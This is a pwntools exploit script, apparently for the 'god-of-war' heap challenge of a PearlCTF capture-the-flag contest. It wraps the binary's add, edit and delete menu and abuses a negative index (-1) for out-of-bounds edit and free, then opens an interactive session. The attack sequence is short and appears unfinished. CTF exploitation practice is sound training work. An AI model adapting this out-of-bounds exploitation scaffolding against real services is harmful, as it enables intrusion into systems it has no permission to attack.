#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("./god-of-war_patched")
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")
ld = ELF("./ld-2.35.so")
context.binary = exe

host = "dyn.ctf.pearlctf.in"
port = 30020

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---
menu_choice = b"Enter choice: "
# functions

def ADD(name: bytes = b'a', atk: int=0, defence: int=0):
    sla(menu_choice, b"1")
    sla(b"Enter hero's name: ", name)
    sla(b"Enter attack: ", str(atk).encode())
    sla(b"Enter defence: ", str(defence).encode())

def VIEW():
    sla(menu_choice, b"2")
    
def EDIT(index: int, name: bytes, atk, defence):
    sla(menu_choice, b"3")
    sla(b"Enter the index of the hero: ", str(index).encode())
    sla(b"Enter hero's name: ", name)
    sla(b"Enter attack: ", str(atk).encode())
    sla(b"Enter defence: ", str(defence).encode())

def DELETE(index: int):
    sla(menu_choice, b"4")
    sla(b"Enter the index of the hero: ", str(index).encode())
    
def EXAMPLE():
    sla(menu_choice, b"5")
    
def SOLO(op_name: bytes):
    sla(menu_choice, b"6")
    sla(b"Enter opponent's name: ", op_name)

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x04018F8
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

ADD()
EXAMPLE()
EDIT(-1, b"x"*32, u64(b"aaaaaaaa"), u64(b"bbbbbbbb"))
EXAMPLE()
DELETE(-1)

io.interactive()

